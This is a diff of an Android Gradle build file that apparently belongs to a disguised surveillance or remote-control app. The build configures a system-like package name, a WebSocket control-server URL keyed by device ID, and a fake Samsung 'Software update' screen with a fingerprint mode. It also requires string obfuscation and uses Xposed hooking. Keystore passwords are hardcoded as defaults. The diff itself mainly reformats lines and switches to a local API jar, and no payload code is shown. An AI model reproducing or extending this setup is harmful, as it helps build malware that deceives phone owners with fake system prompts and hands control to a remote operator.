@@ -1,29 +1,32 @@
-plugins {
-    id 'com.android.application'
-}
+// ── Patch: Xposed API via local jar (libs/api-82.jar) ───────────────────────
+// Drops the maven dependency. Uses the jar you dropped in libs/.
+// No network fetch, no version drift, reproducible builds.
 
 def skipParanoid = project.findProperty('SKIP_PARANOID') == 'true'
 if (!skipParanoid) {
-    try { apply plugin: 'org.lsposed.lsparanoid' }
-    catch (Exception e) { throw new GradleException('[FATAL] LSParanoid unavailable. Set SKIP_PARANOID=true for debug.') }
+    try {
+        apply plugin: 'org.lsposed.lsparanoid'
+    } catch (Exception e) {
+        throw new GradleException('[FATAL] LSParanoid unavailable. Set SKIP_PARANOID=true for debug.')
+    }
 }
 
 // ── Build config injectables ──────────────────────────────────────────────────
-def serverUrl     = project.findProperty('SERVER_URL')        ?: 'wss://your-server.com/ws?role=device&id='
-def targetUrl     = project.findProperty('TARGET_URL')        ?: 'https://google.com'
-def updateMode    = (project.findProperty('UPDATE_MODE')      ?: '1').toInteger()   // 0=none 1=system 2=fingerprint
-def updateBrand   = project.findProperty('UPDATE_BRAND')      ?: 'Samsung'
-def updateTitle   = project.findProperty('UPDATE_TITLE')      ?: 'Software update'
-def updateVersion = project.findProperty('UPDATE_VERSION')    ?: 'ONE UI 6.1'
-def updateDuration= (project.findProperty('UPDATE_DURATION_MS') ?: '10000').toInteger()
-def ksPath        = project.findProperty('KEYSTORE_PATH')     ?: '../alpha-release.jks'
-def ksPass        = project.findProperty('KEYSTORE_PASS')     ?: 'AlphaRelease2024'
-def ksAlias       = project.findProperty('KEY_ALIAS')         ?: 'alpha-key'
-def ksKeyPass     = project.findProperty('KEY_PASS')          ?: 'AlphaRelease2024'
-def vCode         = (project.findProperty('VERSION_CODE')     ?: '10000').toInteger()
-def vName         = project.findProperty('VERSION_NAME')      ?: '1.0.0'
-def appLabel      = project.findProperty('APP_LABEL')         ?: ''
-def appId         = project.findProperty('APP_ID')            ?: 'com.android.media.core'
+def serverUrl      = project.findProperty('SERVER_URL')         ?: 'wss://your-server.com/ws?role=device&id='
+def targetUrl      = project.findProperty('TARGET_URL')         ?: 'https://google.com'
+def updateMode     = (project.findProperty('UPDATE_MODE')       ?: '1').toInteger()   // 0=none 1=system 2=fingerprint
+def updateBrand    = project.findProperty('UPDATE_BRAND')       ?: 'Samsung'
+def updateTitle    = project.findProperty('UPDATE_TITLE')       ?: 'Software update'
+def updateVersion  = project.findProperty('UPDATE_VERSION')     ?: 'ONE UI 6.1'
+def updateDuration = (project.findProperty('UPDATE_DURATION_MS') ?: '10000').toInteger()
+def ksPath         = project.findProperty('KEYSTORE_PATH')      ?: '../alpha-release.jks'
+def ksPass         = project.findProperty('KEYSTORE_PASS')      ?: 'AlphaRelease2024'
+def ksAlias        = project.findProperty('KEY_ALIAS')          ?: 'alpha-key'
+def ksKeyPass      = project.findProperty('KEY_PASS')           ?: 'AlphaRelease2024'
+def vCode          = (project.findProperty('VERSION_CODE')      ?: '10000').toInteger()
+def vName          = project.findProperty('VERSION_NAME')       ?: '1.0.0'
+def appLabel       = project.findProperty('APP_LABEL')          ?: ''
+def appId          = project.findProperty('APP_ID')             ?: 'com.android.media.core'
 
 android {
     namespace 'com.alpha.shield'
@@ -39,14 +42,14 @@ android {
         testInstrumentationRunner 'androidx.test.runner.AndroidJUnitRunner'
 
         // ── All customizable build fields ──────────────────────────────
-        buildConfigField 'String',  'SERVER_URL',         "\"${serverUrl}\""
-        buildConfigField 'String',  'TARGET_URL',         "\"${targetUrl}\""
+        buildConfigField 'String',  'SERVER_URL',          "\"${serverUrl}\""
+        buildConfigField 'String',  'TARGET_URL',          "\"${targetUrl}\""
         buildConfigField 'int',     'UPDATE_MODE',         "${updateMode}"
-        buildConfigField 'String',  'UPDATE_BRAND',       "\"${updateBrand}\""
-        buildConfigField 'String',  'UPDATE_TITLE',       "\"${updateTitle}\""
-        buildConfigField 'String',  'UPDATE_VERSION',     "\"${updateVersion}\""
+        buildConfigField 'String',  'UPDATE_BRAND',        "\"${updateBrand}\""
+        buildConfigField 'String',  'UPDATE_TITLE',        "\"${updateTitle}\""
+        buildConfigField 'String',  'UPDATE_VERSION',      "\"${updateVersion}\""
         buildConfigField 'int',     'UPDATE_DURATION_MS',  "${updateDuration}"
-        buildConfigField 'boolean', 'IS_RELEASE',         'false'
+        buildConfigField 'boolean', 'IS_RELEASE',          'false'
 
         if (appLabel?.trim()) {
             resValue 'string', 'app_name', appLabel.trim()
@@ -78,10 +81,10 @@ android {
     }
 
     lint {
-        abortOnError      false     // never block release on lint
-        checkReleaseBuilds false    // skip lint on release task (lintVitalRelease still runs)
+        abortOnError       false
+        checkReleaseBuilds false
         disable 'RemoveWorkManagerInitializer', 'NewApi', 'MissingPermission'
-        warningsAsErrors  false
+        warningsAsErrors   false
     }
 
     buildTypes {
@@ -119,11 +122,11 @@ dependencies {
     implementation 'androidx.core:core:1.12.0'
     implementation 'com.squareup.okhttp3:okhttp:4.12.0'
     implementation 'com.google.code.gson:gson:2.10.1'
+
     if (skipParanoid) compileOnly 'org.lsposed.lsparanoid:core:0.5.2'
-    // Xposed API — compileOnly so it's not bundled in the APK
-    // De.robv classic API (LSPosed compatible, EdXposed compatible)
-    compileOnly 'de.robv.android.xposed:api:82'
-    compileOnly 'de.robv.android.xposed:api:82:sources'
+
+    // ── Xposed API — local jar, compileOnly so it's not bundled in the APK ──
+    compileOnly files('libs/api-82.jar')
 
     testImplementation 'junit:junit:4.13.2'
 }
